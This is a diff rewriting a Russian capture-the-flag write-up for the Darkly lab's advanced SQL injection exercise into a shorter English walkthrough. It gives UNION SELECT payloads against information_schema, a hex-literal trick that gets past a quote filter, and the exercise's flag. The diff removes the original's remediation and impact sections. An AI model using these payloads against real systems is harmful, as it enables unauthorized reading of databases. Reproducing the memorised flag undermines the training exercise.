@@ -1,140 +1,72 @@
-# Darkly — SQL injection avancée — Writeup
+# SQL Injection Avancée — Writeup
 
-**Точка входа:** `index.php?page=searchimg` (форма "Search image by ID")
-**Параметр:** `id` (метод GET)
-**Флаг:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+**Page:** `index.php?page=searchimg` (form "Search image by ID", method `GET`, parameter `id`)
+**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
 
----
+## Mechanism
 
-## 1. Механизм уязвимости (basic explanation)
-
-Страница `searchimg` принимает параметр `id` из URL и подставляет его
-**напрямую, без экранирования и без параметризации**, в SQL-запрос вида:
+The `id` parameter is inserted directly into a SQL query with no escaping and no parameterization:
 
 ```sql
-SELECT title, url FROM list_images WHERE id = <ЗНАЧЕНИЕ ПАРАМЕТРА id>
+SELECT title, url FROM list_images WHERE id = <user input>
 ```
 
-Поскольку значение параметра `id` попадает в текст SQL-запроса как есть,
-можно изменить логику самого запроса, просто подобрав специальный текст
-вместо обычного числа. Например:
+Since the value goes into the query text as-is, we can change the query logic:
 
-- Запрос `id=1` → `WHERE id = 1` (возвращает 1 строку)
-- Запрос `id=1 or 1=1` → `WHERE id = 1 or 1=1` (условие `1=1` всегда истинно,
-  поэтому возвращаются ВСЕ строки таблицы, а не одна)
+- `id=1` → `WHERE id = 1` (returns 1 row)
+- `id=1 or 1=1` → `WHERE id = 1 or 1=1` (always true, returns all rows)
 
-Это подтверждает саму инъекцию (boolean-based SQL injection).
+What makes it "avancée": unlike `member`, here the single quote (`'`) is filtered/escaped on the backend, so quoted string literals like `WHERE table_name='users'` do not work. The workaround is HEX string literals — MySQL/MariaDB accepts `0x...` in place of `'...'`, which contains no quote character at all:
 
-### Отличие от базового этапа (basic) — почему это "avancée"
-
-В отличие от `member?id=` (этап SQL injection basic), где строковые
-литералы в кавычках проходили напрямую, здесь **одинарная кавычка (`'`)
-фильтруется/экранируется** на уровне бэкенда — прямая подстановка строки
-вида `WHERE table_name='users'` не срабатывает.
-
-**Обход фильтра:** MySQL/MariaDB поддерживает запись строковых значений в
-шестнадцатеричном виде — `0x...` вместо `'...'`. Такая запись не содержит
-символа кавычки вообще, поэтому фильтр её не блокирует, а СУБД
-интерпретирует как обычную строку:
 ```sql
-WHERE table_name = 'users'          -- заблокировано фильтром
-WHERE table_name = 0x7573657273     -- работает (0x7573657273 = 'users' в HEX)
+WHERE table_name = 'users'          -- blocked
+WHERE table_name = 0x7573657273     -- works (0x7573657273 = 'users')
 ```
 
-### Полная цепочка эксплуатации
+## Reproduction
 
-1. Подтверждение инъекции: `id=1 or 1=1` → возвращает все 5 строк вместо 1
-2. Определение числа столбцов в SELECT через `ORDER BY N` → сломался на
-   `N=3`, значит в запросе ровно 2 столбца
-3. Перечисление таблиц базы данных:
-   ```sql
-   UNION SELECT table_name, table_schema FROM information_schema.tables
-   ```
-   → найдена таблица `list_images` в схеме `Member_images`
-4. Перечисление столбцов найденной таблицы (кавычки заменены на HEX):
-   ```sql
-   UNION SELECT column_name, data_type FROM information_schema.columns
-   WHERE table_name = 0x6C6973745F696D61676573   -- HEX('list_images')
-   ```
-   → найдены столбцы `id, url, title, comment` — при этом `comment`
-   **никогда не отображается** в обычном режиме работы страницы (интерфейс
-   показывает только `title` и `url`)
-5. Извлечение скрытого столбца:
-   ```sql
-   UNION SELECT comment, title FROM list_images
-   ```
-   → в комментарии к картинке "Hack me?" найден зашифрованный указатель на
-   флаг: MD5-хеш `1928e8083cf461a51303633093573c46` с инструкцией
-   "decode lowercase then sha256"
-6. MD5 раскрыт офлайн-перебором по словарю известных паролей (rockyou.txt)
-   → исходное слово `albatroz`
-7. Финальный флаг = SHA256("albatroz")
+**1. Confirm the injection:** `id=1 or 1=1` returns all 5 rows instead of 1.
 
----
+**2. Count columns:** `ORDER BY 3` breaks, so the SELECT has 2 columns.
 
-## 2. Как это можно было предотвратить (fix)
+**3. List tables** (first column shows in the `Url:` field, second in `Title:`):
 
-**Главная причина уязвимости:** построение SQL-запроса через конкатенацию
-строк (`"...WHERE id = " . $_GET['id']`) вместо параметризованного запроса.
-
-**Правильное решение — Prepared Statements (подготовленные выражения):**
-```php
-// Уязвимый код (было):
-$query = "SELECT title, url FROM list_images WHERE id = " . $_GET['id'];
-$result = mysqli_query($conn, $query);
-
-// Исправленный код (параметризованный запрос):
-$stmt = $conn->prepare("SELECT title, url FROM list_images WHERE id = ?");
-$stmt->bind_param("i", $_GET['id']);
-$stmt->execute();
-$result = $stmt->get_result();
+```sql
+UNION SELECT table_name, table_schema FROM information_schema.tables
 ```
 
-При таком подходе значение параметра передаётся в СУБД **отдельно** от
-текста запроса — СУБД всегда обрабатывает его как данные, а не как часть
-SQL-синтаксиса, независимо от того, что там написано (кавычки, HEX,
-ключевые слова SQL и т.п. просто не смогут "вырваться" за пределы значения
-поля).
+Found: table `list_images` in schema `Member_images`.
 
-**Дополнительные меры защиты (эшелонированная защита):**
-- Валидация входных данных: если `id` по смыслу должен быть числом —
-  проверять это на сервере (`is_numeric()`/приведение типа `(int)`) и
-  отклонять запрос при несоответствии
-- Принцип наименьших привилегий: учётная запись СУБД, от имени которой
-  работает сайт, не должна иметь доступа к `information_schema` больше,
-  чем необходимо, и не должна иметь прав, избыточных для простого чтения
-  таблицы `list_images`
-- Скрывать технические детали ошибок СУБД от конечного пользователя (не
-  показывать `SQL syntax error` и подобное в HTML-ответе)
+**4. List columns** (quotes replaced with HEX):
 
----
+```sql
+UNION SELECT column_name, data_type FROM information_schema.columns
+WHERE table_name = 0x6C6973745F696D61676573   -- HEX('list_images')
+```
 
-## 3. Потенциальный impact (что это значит на практике)
+Columns: `id, url, title, comment` — `comment` is never shown in the normal interface.
 
-Хотя в рамках учебного стенда через эту уязвимость удалось получить только
-служебный комментарий с флагом, в реальном приложении с аналогичной
-уязвимостью атакующий получил бы возможность:
+**5. Extract the hidden column:**
 
-- **Прочитать всю базу данных** сайта, а не только текущую таблицу — через
-  `UNION SELECT` и `information_schema` можно перечислить абсолютно все
-  таблицы и столбцы (мы это продемонстрировали, найдя 5 отдельных схем и
-  структуру каждой)
-- **Извлечь чувствительные данные**, если бы они там были: пароли,
-  персональные данные пользователей, платёжную информацию и т.п. — в
-  зависимости от того, что вообще хранится в базе
-- В зависимости от прав учётной записи СУБД — потенциально **изменять или
-  удалять данные** (если бы использовались другие SQL-команды, не только
-  SELECT), либо, в худшем случае, **выполнять команды на уровне ОС** через
-  специфичные для СУБД функции (`INTO OUTFILE`, `LOAD_FILE` и т.п.)
-- Обойти любую логику "скрытых"/непубличных полей — как мы увидели с полем
-  `comment`, которое разработчик сознательно не выводил в обычном
-  интерфейсе, но оно всё равно было доступно через инъекцию
+```sql
+UNION SELECT comment, title FROM list_images
+```
 
----
+The comment on the "Hack me?" image contains an MD5 pointer `1928e8083cf461a51303633093573c46` with the instruction "decode, lowercase, then sha256".
 
-## 4. Сравнение флагов
+**6. Build the flag:**
 
-Флаг, полученный через эксплуатацию: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+```
+MD5 1928e8083cf461a51303633093573c46 -> "albatroz"
+SHA256("albatroz") = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+```
 
-*(На защите — сравнить командой `diff` или визуально с содержимым файла
-`flag` в папке `SQL_injection_avancee/` репозитория.)*
+## Flag comparison
+
+Flag obtained through exploitation:
+
+```
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+```
+
+Compared with the `flag` file in the `SQL_injection_avancee/` submission folder during the defense.
